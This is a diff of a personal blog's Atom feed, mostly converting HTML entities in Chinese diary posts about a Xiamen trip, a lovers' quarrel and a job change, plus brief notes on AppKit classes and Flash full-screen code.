+<p>那天的天气，有点小小的阳光，不过并不透彻，不过看到一片茫茫大海，满耳全是海水拍打沙滩的声音的时候，又是心中有爱的时候，这一切总归是美的。看到海浪一波波往沙滩上冲刷，情不自禁想和大海来个亲密接触，于是试探着探出我的小红鞋去踩浪花，哈哈，这一试，果然就中招了….海水远远看起来平静，有规律，当人站在水与沙的边缘，以为水每次的拍打都是相同节奏相同强度的时候，大海就会使出她调皮的本性，突然嬉皮笑脸的一个猛冲，小小一个玩笑，沾湿你的鞋子和袜子~~~于是我就在大海的小小伎俩中中招了…小红鞋和袜子一次性湿透透…湿了倒好，哈哈，成全我的天性，提着鞋子更加放肆的冲进大海，不过，终究还是因为不会游泳还是止步于浅滩~~~遥望远处有汽艇，疾驰在遥远的海平面上，突然望洋兴叹….自由的快感与搏命的风险是共存的啊….我还是老老实实在沙滩上走着吧…</p>
 
-<p>鞋子湿透透了，湿哒哒的，灌满了咸咸的海水和细细的沙子&hellip;找到旁边的小亭子，想赖皮让Chandlewei给我买凉拖鞋，发嗲撒娇撒泼，都无济于事，男人真是狠心的动物啊&hellip;于是我豪气的扔掉了袜子，唰唰的穿上了湿哒哒的小帆布鞋，鞋里还有那些怎么抖落也抖不出来的沙子，于是我一边负气，一边得瑟的一扭一扭的向前走，还好心中满载着与大海亲密接触的满足感，不然真被这人气死啦~~~~</p>
+<p>鞋子湿透透了，湿哒哒的，灌满了咸咸的海水和细细的沙子…找到旁边的小亭子，想赖皮让Chandlewei给我买凉拖鞋，发嗲撒娇撒泼，都无济于事，男人真是狠心的动物啊…于是我豪气的扔掉了袜子，唰唰的穿上了湿哒哒的小帆布鞋，鞋里还有那些怎么抖落也抖不出来的沙子，于是我一边负气，一边得瑟的一扭一扭的向前走，还好心中满载着与大海亲密接触的满足感，不然真被这人气死啦~~~~</p>
 
 <p>南普陀寺到此一游：</p>
 
-<p>去南普陀寺完全是到此一游，其实我们还是抱着要爬一下寺庙背后的观音山的，据说爬到顶再下来也是要半天时间的，正想着可以满足下从小生在上海这个大平原的Chandle对山的渴望，结果到了南普陀寺，发现寺庙就在观音山下面，那个观音山哪里是座山，分明就是一片凹凸不平的土地上，凸出得稍微有点显眼的土丘&hellip;顿时没了爬山的兴致，再一看，南普陀寺和全天下的寺庙也没什么差别&hellip;我还傻帽的在佛像前问：南普陀寺和静安寺有什么不同啊？？被Chandle狠狠鄙视了一番&hellip;</p>
+<p>去南普陀寺完全是到此一游，其实我们还是抱着要爬一下寺庙背后的观音山的，据说爬到顶再下来也是要半天时间的，正想着可以满足下从小生在上海这个大平原的Chandle对山的渴望，结果到了南普陀寺，发现寺庙就在观音山下面，那个观音山哪里是座山，分明就是一片凹凸不平的土地上，凸出得稍微有点显眼的土丘…顿时没了爬山的兴致，再一看，南普陀寺和全天下的寺庙也没什么差别…我还傻帽的在佛像前问：南普陀寺和静安寺有什么不同啊？？被Chandle狠狠鄙视了一番…</p>
 
-<p>说到寺庙，Chandle上次去静安寺的时候跟我讲，男女同时迈进庙门的话，需要男抬左脚女抬右脚的，可可是我每次都忘记，大概是习惯了和Chandle保持同样的步调的原因吧，我们俩走路的姿势越来越像，不过是我越来越像他，左摇右摆大大咧咧，连外八字外的角度都一样，两人左脚右脚走起来就是两条平行线，认识他前仅有的一点点女孩子的优雅现在都荡然无存&hellip;</p>
+<p>说到寺庙，Chandle上次去静安寺的时候跟我讲，男女同时迈进庙门的话，需要男抬左脚女抬右脚的，可可是我每次都忘记，大概是习惯了和Chandle保持同样的步调的原因吧，我们俩走路的姿势越来越像，不过是我越来越像他，左摇右摆大大咧咧，连外八字外的角度都一样，两人左脚右脚走起来就是两条平行线，认识他前仅有的一点点女孩子的优雅现在都荡然无存…</p>
 
-<p>在南普陀寺庙门外买了两柱香，离大门口比较近的那个香台人流拥挤，chandle拉着我一直往前走，结果走了不到一分钟穿过滚滚人流之后，与之对应的另一个香台一个人都木有，我们给了香火费，各点一炷香，诚意拜见，许下那些每到一个地方必须许下的愿望，希望各方神灵都保佑吧。毕竟，我们是那么努力的生活着的人啊&hellip;</p>
+<p>在南普陀寺庙门外买了两柱香，离大门口比较近的那个香台人流拥挤，chandle拉着我一直往前走，结果走了不到一分钟穿过滚滚人流之后，与之对应的另一个香台一个人都木有，我们给了香火费，各点一炷香，诚意拜见，许下那些每到一个地方必须许下的愿望，希望各方神灵都保佑吧。毕竟，我们是那么努力的生活着的人啊…</p>
 
 <p>厦门大学兜到迷路：</p>
 
-<p>传说厦门大学不是谁都能进的。同事小镜子跟我说一定要去一趟厦门大学，当年她们到厦大的时候就是因为遇到旅游高峰季节，厦门大学封校，不许外来游客进入。我们俩从南普陀寺出来，觉得收获寥寥，不如到厦大去看看试试运气，到校门发现只需要登记一个人的身份证号码就可以进入了，哈哈，这么大牌的学校&hellip;华师大可从来没有这样严格控制过人流出入&hellip;这给人的期待值之高，如果没啥风景可言，那该叫人情何以堪啊&hellip;</p>
+<p>传说厦门大学不是谁都能进的。同事小镜子跟我说一定要去一趟厦门大学，当年她们到厦大的时候就是因为遇到旅游高峰季节，厦门大学封校，不许外来游客进入。我们俩从南普陀寺出来，觉得收获寥寥，不如到厦大去看看试试运气，到校门发现只需要登记一个人的身份证号码就可以进入了，哈哈，这么大牌的学校…华师大可从来没有这样严格控制过人流出入…这给人的期待值之高，如果没啥风景可言，那该叫人情何以堪啊…</p>
 
-<p>人家越是说好的地方，我们总是带着一种逆反的心理去看，一来是觉得自己是特别的，什么小资情调，小清新味儿，我们不和你们一派的，我们是自立门派，加上前面南普陀寺游得并不给力，对厦门大学的期望值哪真叫一个低&hellip;</p>
+<p>人家越是说好的地方，我们总是带着一种逆反的心理去看，一来是觉得自己是特别的，什么小资情调，小清新味儿，我们不和你们一派的，我们是自立门派，加上前面南普陀寺游得并不给力，对厦门大学的期望值哪真叫一个低…</p>
 
-<p>进去了，发现&hellip;我们好像有点错了&hellip;先是溜达了半个小时，看到各式各样的古色古香的建筑，厦大的校史展览馆，绵延好几百米，哎，这叫一个大气~~~男生宿舍外表那个富丽堂皇，如果不是看到男款小内内晒晾在窗台上，还以为是一城市博物馆&hellip;攻略说厦大超级适合谈恋爱，小山小湖泊，出门还能看到海滩&hellip;所以我们刚开始本来冲着厦大的小湖泊去的，不过半个小时一点湖泊的影子也木有，我们反倒是饿了，一路走来也没看到什么小卖部、学生食堂什么的，问了里面看起来像学生的一个小姑娘，小姑娘跟我们说前面转弯就是，于是我们又信心满满的往前走，么料到，走了很久才到转弯，还是个小小的食堂&hellip;据说前面的大食堂还要再走会儿&hellip;受不了了！！找出我们囤积的鸡爪、鸭肫，在一个小树林里不顾形象的啃了起来，饭饱&hellip;重新上路&hellip;</p>
+<p>进去了，发现…我们好像有点错了…先是溜达了半个小时，看到各式各样的古色古香的建筑，厦大的校史展览馆，绵延好几百米，哎，这叫一个大气~~~男生宿舍外表那个富丽堂皇，如果不是看到男款小内内晒晾在窗台上，还以为是一城市博物馆…攻略说厦大超级适合谈恋爱，小山小湖泊，出门还能看到海滩…所以我们刚开始本来冲着厦大的小湖泊去的，不过半个小时一点湖泊的影子也木有，我们反倒是饿了，一路走来也没看到什么小卖部、学生食堂什么的，问了里面看起来像学生的一个小姑娘，小姑娘跟我们说前面转弯就是，于是我们又信心满满的往前走，么料到，走了很久才到转弯，还是个小小的食堂…据说前面的大食堂还要再走会儿…受不了了！！找出我们囤积的鸡爪、鸭肫，在一个小树林里不顾形象的啃了起来，饭饱…重新上路…</p>
 
-<p>走着走着越发感叹这厦大真是..忒大了&hellip;地图上看起来近在咫尺的湖泊，走了快一个小时了还四顾茫然，一不小心还走绕路了&hellip;看完地图发现更加迷茫&hellip;厦大地势完全不同于上海的大学一望皆是平原，这里有高有低，有古老也有现代，有湖泊有海滩，还有，高尔夫球场&hellip;哎，这哪里是读书，简直就是神仙修炼之山林&hellip;所以相信或者不相信攻略，都是相对的啊，有那么多人称赞的地方，一定是个好地方&hellip;</p>
+<p>走着走着越发感叹这厦大真是..忒大了…地图上看起来近在咫尺的湖泊，走了快一个小时了还四顾茫然，一不小心还走绕路了…看完地图发现更加迷茫…厦大地势完全不同于上海的大学一望皆是平原，这里有高有低，有古老也有现代，有湖泊有海滩，还有，高尔夫球场…哎，这哪里是读书，简直就是神仙修炼之山林…所以相信或者不相信攻略，都是相对的啊，有那么多人称赞的地方，一定是个好地方…</p>
 
-<p>我们在茫然的时候索性就不管地图了，看见路就上，怎么新鲜怎么走，这路一会儿山路盘旋，一会儿平坦如大马路，还有小假山，走走发现居然还有真的山<del>~~哈哈，南普陀寺没爬山，难道我们到厦大要爬一次？我俩趁着刚吃饱的劲儿，蹭蹭蹭蹿上了小山头，说是小山头也确实不是高耸入云的山峰，也只能算丘陵一样的地方，但是植被倒是茂盛得很，山间的小石栈道修得煞是整齐，不得不赞叹厦大真是有钱的地儿&hellip;爬的我们俩都是都出了一身汗&hellip;畅快淋漓，到山顶了发现山外还有山，那种感觉真是无比奇妙啊，虽然我也算山里出来的孩子，但是在一大学里有这等景象还是狠狠惊了我一回&hellip;不过确实没这劲头继续攀爬啦。，不然真的不知道走到哪里去了。下山是没有修好的小石阶梯路的，不过常有人走，也踩出了一条斜径，我们抖抖索索的往下爬，路上还遇到一个小老头提着水桶往上爬，问他，他说是护林人&hellip;原来这山，是有主人的..O(∩_∩)O</del></p>
+<p>我们在茫然的时候索性就不管地图了，看见路就上，怎么新鲜怎么走，这路一会儿山路盘旋，一会儿平坦如大马路，还有小假山，走走发现居然还有真的山~~~哈哈，南普陀寺没爬山，难道我们到厦大要爬一次？我俩趁着刚吃饱的劲儿，蹭蹭蹭蹿上了小山头，说是小山头也确实不是高耸入云的山峰，也只能算丘陵一样的地方，但是植被倒是茂盛得很，山间的小石栈道修得煞是整齐，不得不赞叹厦大真是有钱的地儿…爬的我们俩都是都出了一身汗…畅快淋漓，到山顶了发现山外还有山，那种感觉真是无比奇妙啊，虽然我也算山里出来的孩子，但是在一大学里有这等景象还是狠狠惊了我一回…不过确实没这劲头继续攀爬啦。，不然真的不知道走到哪里去了。下山是没有修好的小石阶梯路的，不过常有人走，也踩出了一条斜径，我们抖抖索索的往下爬，路上还遇到一个小老头提着水桶往上爬，问他，他说是护林人…原来这山，是有主人的..O(∩_∩)O~</p>
 
-<p>下山，柳暗花明又一村，那个传说中的湖泊就突然出现在了眼前，哈哈，得来全不费工夫&hellip;很奇妙，湖水很清澈，四周被山所包围，虽然没有世外桃源的幽宁，但是也有耳目一新的感觉，坐在湖边畅想了下古往今来，彼此感慨了一番，决定出去&hellip;</p>
+<p>下山，柳暗花明又一村，那个传说中的湖泊就突然出现在了眼前，哈哈，得来全不费工夫…很奇妙，湖水很清澈，四周被山所包围，虽然没有世外桃源的幽宁，但是也有耳目一新的感觉，坐在湖边畅想了下古往今来，彼此感慨了一番，决定出去…</p>
 
-<p>厦大给我们的惊喜很多，这里不一一赘述，美总是留在心中的&hellip;风景要看，光靠笔记录，那是有限的&hellip;两人手拉手什么都不想，什么都不管，周围人也并不认得我们，那种自由的心情，那种只需要享受现在的轻松，又岂是文字所能描述的&hellip;</p>
+<p>厦大给我们的惊喜很多，这里不一一赘述，美总是留在心中的…风景要看，光靠笔记录，那是有限的…两人手拉手什么都不想，什么都不管，周围人也并不认得我们，那种自由的心情，那种只需要享受现在的轻松，又岂是文字所能描述的…</p>
+
 ]]></content>
   </entry>
   
@@ -375,13 +404,13 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/16/%E7%9C%8B%E5%BE%97%E5%BF%83%E9%83%BD%E9%87%8E%E4%BA%86/"/>
     <updated>2011-04-16T15:07:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/16/看得心都野了</id>
-    <content type="html"><![CDATA[<p>我们要买帐篷，买登山鞋，买防雨罩，你去学摩托车吧，我去研究逃生技能，学习看google地图，学习如何防晒，学习哪些野菜能吃，怎么看是坏人还是好人&hellip;我们这就出发去旅行把</p>
+    <content type="html"><![CDATA[<p>我们要买帐篷，买登山鞋，买防雨罩，你去学摩托车吧，我去研究逃生技能，学习看google地图，学习如何防晒，学习哪些野菜能吃，怎么看是坏人还是好人…我们这就出发去旅行把</p>
 
-<p>我们已经买好包包，每次路过龙之梦就去nike店里去看的那个包包，已经大价钱买下来了，两个包包的钱都够一次短途的穷游了&hellip;可是没办法啊，千金难买爷你喜欢啊~~~~~你也30岁了，我也不年轻了，这个时候不抓紧时间去疯，将来就要老了&hellip;</p>
+<p>我们已经买好包包，每次路过龙之梦就去nike店里去看的那个包包，已经大价钱买下来了，两个包包的钱都够一次短途的穷游了…可是没办法啊，千金难买爷你喜欢啊~~~~~你也30岁了，我也不年轻了，这个时候不抓紧时间去疯，将来就要老了…</p>
 
-<p>路上我们可以装作普通的朋友，比对下谁的艳遇更多，我们不必当有素质有体力的驴友，只想随心所欲的环游世界，这个世界，可以很大，也可以很小，我不介意厚脸皮伸出大腿拦截路边的过路车，也不介意没有住的地方就住咱们的小帐篷，或者家庭旅馆，如果遇到淳朴的藏民他们不爱洗脚不爱洗脸，我也觉得没有关系&hellip;</p>
+<p>路上我们可以装作普通的朋友，比对下谁的艳遇更多，我们不必当有素质有体力的驴友，只想随心所欲的环游世界，这个世界，可以很大，也可以很小，我不介意厚脸皮伸出大腿拦截路边的过路车，也不介意没有住的地方就住咱们的小帐篷，或者家庭旅馆，如果遇到淳朴的藏民他们不爱洗脚不爱洗脸，我也觉得没有关系…</p>
 
-<p>我想去爬山，看海，看一切我没看过的风景&hellip;当然，最好有你作陪&hellip;.在每次旅途里认识朋友，认识风景，重新打量自己，也一次次的重新喜欢上彼此。天涯海角，相依为命。</p>
+<p>我想去爬山，看海，看一切我没看过的风景…当然，最好有你作陪….在每次旅途里认识朋友，认识风景，重新打量自己，也一次次的重新喜欢上彼此。天涯海角，相依为命。</p>
 
 <p> </p>
 ]]></content>
@@ -409,21 +438,21 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/14/%E5%92%86%E5%93%AE/"/>
     <updated>2011-04-14T22:54:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/14/咆哮</id>
-    <content type="html"><![CDATA[<p>今天导火线是因为我过于“咆哮”，导致你非常不满，然后你一路咆哮，我本来是晴，后来转成倾盆大雨&hellip;.</p>
+    <content type="html"><![CDATA[<p>今天导火线是因为我过于“咆哮”，导致你非常不满，然后你一路咆哮，我本来是晴，后来转成倾盆大雨….</p>
 
-<p>我的错我很快就意识到了&hellip;</p>
+<p>我的错我很快就意识到了…</p>
 
-<p>你也一样&hellip;.</p>
+<p>你也一样….</p>
 
-<p>你说我们俩吵架是不是太不曲折了&hellip;</p>
+<p>你说我们俩吵架是不是太不曲折了…</p>
 
 <p>我总是不能自已的在人多的场合“发疯”，要么不高兴给脸色的“不识大体”，要么兴奋过头触及你的“bottomline”。我总是忘记一些基本的处事规则，这让你抓住我的小辫子愤愤不已的对我“咆哮”！</p>
 
-<p>你本来是个低调得不能再低调的人，而我总是一点也不掩饰自己的喜乐，我担心吃饭冷场，我担心没有气氛，自己愿意“以身犯险”，不料其实你是那么排斥，而且我也没考虑到所谓的领导的权威等方面的因素&hellip;.</p>
+<p>你本来是个低调得不能再低调的人，而我总是一点也不掩饰自己的喜乐，我担心吃饭冷场，我担心没有气氛，自己愿意“以身犯险”，不料其实你是那么排斥，而且我也没考虑到所谓的领导的权威等方面的因素….</p>
 
-<p>其实源头是我，本质还是你的生活和工作充满了各种不确定各种不安定不顺利&hellip;我这样说并非要撇清我的责任，而是从另一个方面想，也许真的是我帮得上你的地方太少&hellip;.你那么抓狂，那么崩溃，我也只能在旁边看着而已&hellip;</p>
+<p>其实源头是我，本质还是你的生活和工作充满了各种不确定各种不安定不顺利…我这样说并非要撇清我的责任，而是从另一个方面想，也许真的是我帮得上你的地方太少….你那么抓狂，那么崩溃，我也只能在旁边看着而已…</p>
 
-<p>哎&hellip;今天已经过去了，再不顺利也都顺利的过去了，不是么&hellip;还有什么好难过的&hellip;不如快乐！</p>
+<p>哎…今天已经过去了，再不顺利也都顺利的过去了，不是么…还有什么好难过的…不如快乐！</p>
 ]]></content>
   </entry>
   
@@ -432,16 +461,15 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/12/iphone_%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86%E7%82%B9/"/>
     <updated>2011-04-12T17:19:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/12/iphone_关键知识点</id>
-    <content type="html"><![CDATA[<h4>General User-Interface Classes</h4>
-
-<h2>For the overall functioning of a user interface, the AppKit provides the following classes:</h2>
+    <content type="html"><![CDATA[<h4 id="general-user-interface-classes">General User-Interface Classes</h4>
+<p>For the overall functioning of a user interface, the AppKit provides the following classes:
+-  </p>
 
 <p><strong>The global application object</strong>. Every application uses a singleton instance of <code>NSApplication</code> to control the main event loop, keep track of the application’s windows and menus, distribute events to the appropriate objects (that is, itself or one of its windows), set up top-level autorelease pools, and receive notification of application-level events. An <code>NSApplication</code> object has a delegate (an object that you assign) that is notified when the application starts or terminates, is hidden or activated, should open a file selected by the user, and so forth. By setting the <code>NSApplication</code> object’s delegate and implementing the delegate methods, you customize the behavior of your application without having to subclass <code>NSApplication</code> .</p>
 
 <ul>
-<li></li>
+  <li></li>
 </ul>
-
 
 <p><strong>Windows and views</strong>. The window and view classes, <code>NSWindow</code> and <code>NSView</code> , also inherit from <code>NSResponder</code> , and so are designed to respond to user actions. An <code>NSApplication</code> object maintains a list of <code>NSWindow</code> objects—one for each window belonging to the application—and each <code>NSWindow</code> object maintains a hierarchy of <code>NSView</code> objects. The view hierarchy is used for drawing and handling events within a window. An <code>NSWindow</code> object handles window-level events, distributes other events to its views, and provides a drawing area for its views. An <code>NSWindow</code> object also has a delegate allowing you to customize its behavior.</p>
 
@@ -450,39 +478,35 @@ Uses and Limitations</p>
 <p><code>NSView</code> is the superclass for all objects displayed in a window. All subclasses implement a drawing method using graphics functions; <code>drawRect:</code> is the primary method you override when creating a new <code>NSView</code> .</p>
 
 <ul>
-<li></li>
+  <li></li>
 </ul>
-
 
 <p><strong>Controller classes for Cocoa bindings</strong>. The abstract <code>NSController</code> class and its concrete subclasses <code>NSObjectController</code> , <code>NSArrayController</code> , <code>NSDictionaryController</code> , and <code>NSTreeController</code> are part of the implementation of Cocoa bindings. This technology automatically synchronizes the application data stored in objects and the presentation of that data in a user interface. See <a href="http://developer.apple.com/library/ios/documentation/Cocoa/Conceptual/CocoaFundamentals/CocoaDesignPatterns/CocoaDesignPatterns.html#//apple_ref/doc/uid/TP40002974-CH6-SW1">“The Model-View-Controller Design Pattern”</a> for a description of these types of controller objects.</p>
 
 <ul>
-<li></li>
+  <li></li>
 </ul>
 
-
-<p><strong> Panels (dialogs)</strong>. The <code>NSPanel</code> class is a subclass of <code>NSWindow</code> that you use to display transient, global, or pressing information. For example, you would use an instance of <code>NSPanel</code> , rather than an instance of <code>NSWindow</code> , to display error messages or to query the user for a response to remarkable or unusual circumstances. The AppKit implements some common dialogs for you such as the Save, Open, and Print dialogs, used to save, open, and print documents. Using these dialogs gives the user a consistent look and feel across applications for common operations.</p>
+<p>** Panels (dialogs)**. The <code>NSPanel</code> class is a subclass of <code>NSWindow</code> that you use to display transient, global, or pressing information. For example, you would use an instance of <code>NSPanel</code> , rather than an instance of <code>NSWindow</code> , to display error messages or to query the user for a response to remarkable or unusual circumstances. The AppKit implements some common dialogs for you such as the Save, Open, and Print dialogs, used to save, open, and print documents. Using these dialogs gives the user a consistent look and feel across applications for common operations.</p>
 
 <ul>
-<li></li>
+  <li></li>
 </ul>
 
-
-<p><strong> Menus and cursors</strong>. The <code>NSMenu</code> , <code>NSMenuItem</code> , and <code>NSCursor</code> classes define the look and behavior of the menus and cursors that your application displays to the user.</p>
+<p>** Menus and cursors**. The <code>NSMenu</code> , <code>NSMenuItem</code> , and <code>NSCursor</code> classes define the look and behavior of the menus and cursors that your application displays to the user.</p>
 
 <ul>
-<li></li>
+  <li></li>
 </ul>
-
 
 <p><strong>Grouping and scrolling views</strong>. The <code>NSBox</code> , <code>NSScrollView</code> , and <code>NSSplitView</code> classes provide graphic “accessories” to other view objects or collections of views in windows. With the <code>NSBox</code> class, you can group elements in windows and draw a border around the entire group. The <code>NSSplitView</code> class lets you append views vertically or horizontally, apportioning to each view some amount of a common territory; a sliding control bar lets the user redistribute the territory among views. The <code>NSScrollView</code> class and its helper class, <code>NSClipView</code> , provide a scrolling mechanism as well as the graphic objects that let the user initiate and control a scroll. The <code>NSRulerView</code> class allows you to add a ruler and markers to a scroll view.</p>
 
 <ul>
-<li></li>
+  <li></li>
 </ul>
 
+<p>** Table views and outline views**. The <code>NSTableView</code> class displays data in rows and columns. <code>NSTableView</code> is ideal for, but not limited to, displaying database records, where rows correspond to each record and columns contain record attributes. The user can edit individual cells and rearrange the columns. You control the behavior and content of an <code>NSTableView</code> object by setting its delegate and data source objects. Outline views (instances of <code>NSOutlineView</code> , a subclass of <code>NSTableView</code> ) offer another approach to displaying tabular data. With the <code>NSBrowser</code> class you can create an object with which users can display and navigate hierarchical data.</p>
 
-<p><strong> Table views and outline views</strong>. The <code>NSTableView</code> class displays data in rows and columns. <code>NSTableView</code> is ideal for, but not limited to, displaying database records, where rows correspond to each record and columns contain record attributes. The user can edit individual cells and rearrange the columns. You control the behavior and content of an <code>NSTableView</code> object by setting its delegate and data source objects. Outline views (instances of <code>NSOutlineView</code> , a subclass of <code>NSTableView</code> ) offer another approach to displaying tabular data. With the <code>NSBrowser</code> class you can create an object with which users can display and navigate hierarchical data.</p>
 ]]></content>
   </entry>
   
@@ -492,26 +516,28 @@ Uses and Limitations</p>
     <updated>2011-04-10T17:10:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/10/_flash_全屏快捷键起作用</id>
     <content type="html"><![CDATA[<ol>
-<li><p>必须是flash 10 我是用flash cs 5 发布的</p></li>
-<li><p>代码如下</p></li>
+  <li>
+    <p>必须是flash 10 我是用flash cs 5 发布的</p>
+  </li>
+  <li>
+    <p>代码如下</p>
+  </li>
 </ol>
 
-
-<p>/*Note: App content in AIR can set the value of stage.displayState to<br/>
+<p>/*Note: App content in AIR can set the value of stage.displayState to<br />
                     StageDisplayState.FULL_SCREEN_INTERACTIVE for full keyboard support in full-screen mode.*/</p>
 
 <p>老的定义方式</p>
 
-<p> stage[&ldquo;displayState&rdquo;] = &ldquo;fullScreen&rdquo;;</p>
+<p> stage[“displayState”] = “fullScreen”;</p>
 
 <p>新的全屏起作用的定义方式</p>
 
 <p>stage.displayState = StageDisplayState.FULL_SCREEN_INTERACTIVE;</p>
 
 <ol>
-<li>查阅的链接来自 <a href="http://www.adobe.com/devnet/flashplayer/articles/fplayer10_security_changes.html#head5">http://www.adobe.com/devnet/flashplayer/articles/fplayer10_security_changes.html#head5</a></li>
+  <li>查阅的链接来自 http://www.adobe.com/devnet/flashplayer/articles/fplayer10_security_changes.html#head5</li>
 </ol>
-
 ]]></content>
   </entry>
   
@@ -520,19 +546,19 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/08/%E7%A6%BB%E5%88%AB/"/>
     <updated>2011-04-08T17:34:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/08/离别</id>
-    <content type="html"><![CDATA[<p>大广的最后一天&hellip;</p>
+    <content type="html"><![CDATA[<p>大广的最后一天…</p>
 
-<p>我又换工作了&hellip;.</p>
+<p>我又换工作了….</p>
 
-<p>我也不知道是对还是错，chandlewei觉得是好事，待遇每次跳了之后都在涨，这是好的，可是职业的规划反而越来越模糊&hellip;曾经那些理想啊，梦啊，成为越来越不敢提的东西&hellip;</p>
+<p>我也不知道是对还是错，chandlewei觉得是好事，待遇每次跳了之后都在涨，这是好的，可是职业的规划反而越来越模糊…曾经那些理想啊，梦啊，成为越来越不敢提的东西…</p>
 
-<p>每条路上都充满荆棘。我们的内心是多么害怕困难&hellip;.我是害怕加班么？也不是，我是怕不能平衡加班和生活的矛盾，我想多陪着chandlwei，多和他说说话，我怕我不能掌控时间，我怕被别人被工作的压力牵着鼻子走，我内心充满了恐惧&hellip;</p>
+<p>每条路上都充满荆棘。我们的内心是多么害怕困难….我是害怕加班么？也不是，我是怕不能平衡加班和生活的矛盾，我想多陪着chandlwei，多和他说说话，我怕我不能掌控时间，我怕被别人被工作的压力牵着鼻子走，我内心充满了恐惧…</p>
 
-<p>chanlde已经威逼加恐吓一样的要求我，如何对待工作，可是，这是他站在他喜欢我的立场上，而不是我老板的立场啊&hellip;</p>
+<p>chanlde已经威逼加恐吓一样的要求我，如何对待工作，可是，这是他站在他喜欢我的立场上，而不是我老板的立场啊…</p>
 
-<p>重要的是，我的立场是什么呢，我的立场是，我依然爱他，愿意陪他，希望永远陪他，可是，我也想赚钱，也想为我们的未来多积攒资本&hellip;.</p>
+<p>重要的是，我的立场是什么呢，我的立场是，我依然爱他，愿意陪他，希望永远陪他，可是，我也想赚钱，也想为我们的未来多积攒资本….</p>
 
-<p>矛盾着离开了&hellip;不知道这些矛盾什么时候才能解开呢？</p>
+<p>矛盾着离开了…不知道这些矛盾什么时候才能解开呢？</p>
 ]]></content>
   </entry>
   
@@ -541,132 +567,62 @@ Uses and Limitations</p>
     <link href="http://ChandleWEi.github.io/blog/2011/04/08/%E5%8E%A6%E9%97%A8--%E6%94%BB%E7%95%A5%7E%7E/"/>
     <updated>2011-04-08T11:26:00+08:00</updated>
     <id>http://ChandleWEi.github.io/blog/2011/04/08/厦门&#8211;攻略~~</id>
-    <content type="html"><![CDATA[<p>这是一个大姨妈和感冒横行的日子&hellip;</p>
+    <content type="html"><![CDATA[<p>这是一个大姨妈和感冒横行的日子…</p>
 
 <p>但是我们去了风景宜人的厦门！我日夜思念的厦门~~</p>
 
-<p>攻略点点点&hellip;开始！！（其实不算攻略的吧&hellip;因为我们就几乎没有准备攻略&hellip;我打印了几张纸头，基本上也是丢开没看&hellip;完全就是从零开始认识厦门，其实我觉得这样也是最好的&hellip;不要带着任何既定的画框，全新去构图你心中的美景，你的感受&hellip;）</p>
+<p>攻略点点点…开始！！（其实不算攻略的吧…因为我们就几乎没有准备攻略…我打印了几张纸头，基本上也是丢开没看…完全就是从零开始认识厦门，其实我觉得这样也是最好的…不要带着任何既定的画框，全新去构图你心中的美景，你的感受…）</p>
 
 <p>大体行程：</p>
 
 <p>3天2夜，4月4日上午11点 上海-厦门    4月6日 下午五点 厦门-上海</p>
 
-<p>住：亲戚家旅馆 <a href="http://www.douban.com/group/206382/">http://www.douban.com/group/206382/</a></p>
+<p>住：亲戚家旅馆 http://www.douban.com/group/206382/</p>
 
 <p>4号为清明节节假日价格，双人间180/间/晚      5号为平常日价格130/间/晚</p>
 
-<p>家庭旅馆的好处是便宜又温馨，曾厝垵村子里安静又祥和，亲戚家就在一棵大榕树旁边，我们住4楼顶楼，房间很小，独立卫浴， 电视，网线五脏俱全，虽然洗澡的时候水会从浴室漫出来，有种水漫金山的感觉&hellip;但是，我们不拘小节，哈哈，主要是心情很好，这些小细节都无需介意&hellip;   每天晚上疲惫的回来的时候，老板娘总是笑脸相印，问我们要不要坐下来聊聊天，那种感觉真是&hellip;贴心窝子的暖&hellip;</p>
+<p>家庭旅馆的好处是便宜又温馨，曾厝垵村子里安静又祥和，亲戚家就在一棵大榕树旁边，我们住4楼顶楼，房间很小，独立卫浴， 电视，网线五脏俱全，虽然洗澡的时候水会从浴室漫出来，有种水漫金山的感觉…但是，我们不拘小节，哈哈，主要是心情很好，这些小细节都无需介意…   每天晚上疲惫的回来的时候，老板娘总是笑脸相印，问我们要不要坐下来聊聊天，那种感觉真是…贴心窝子的暖…</p>
 
 <p>行：</p>
 
-<p>主要的景点，按喜爱程度排序：鼓浪屿、环岛路、厦门大学、曾厝垵小渔村、中山路夜市、菜场、南普陀寺庙&hellip;</p>
+<p>主要的景点，按喜爱程度排序：鼓浪屿、环岛路、厦门大学、曾厝垵小渔村、中山路夜市、菜场、南普陀寺庙…</p>
 
-<p>这些地方互相打车基本上在十几块钱，没有超过20块钱的&hellip;公交车基本上1块钱一个人..</p>
+<p>这些地方互相打车基本上在十几块钱，没有超过20块钱的…公交车基本上1块钱一个人..</p>
 
 <p>鼓浪屿：</p>
 
-<p>带着莫大的期望来的..进来之后，有点小小的失望..不过没关系，情绪的起伏也是旅行的一部分吧&hellip;因为没有做功课，所以毫无目的，开始乱溜达，好吧，也许对于我来说，根本是不需要目的的，我确实只是为了乱溜达而已&hellip;但是chandle不是，这是一个没有方向就会抓狂的人，一路走一路查看GPS定位，我无视&hellip;当然这也给我们的过程带来好处，好处就是用最少的时间看了最多的风景&hellip;</p>
+<p>带着莫大的期望来的..进来之后，有点小小的失望..不过没关系，情绪的起伏也是旅行的一部分吧…因为没有做功课，所以毫无目的，开始乱溜达，好吧，也许对于我来说，根本是不需要目的的，我确实只是为了乱溜达而已…但是chandle不是，这是一个没有方向就会抓狂的人，一路走一路查看GPS定位，我无视…当然这也给我们的过程带来好处，好处就是用最少的时间看了最多的风景…</p>
 
-<p>回到对鼓浪屿的感受上来，这是座神奇的小岛，一个在内陆生活了24年的人，一个完全对海岛没有任何想象空间的人，有一天，轮船的汽笛声，靠岸时候的响铃声，就在耳边绵绵不绝的出现，这种奇异的感觉是很难形容的，轮渡摇摇晃晃的前进，身边的人有游客，也有原住民，有的面容如我一样充满新鲜的惊奇，有的司空见惯，死一般沉默&hellip;.这种古老与新鲜的气息在一艘船的缓缓驶出的时间空间里混杂，带着一种神秘的味道，靠岸了&hellip;.</p>
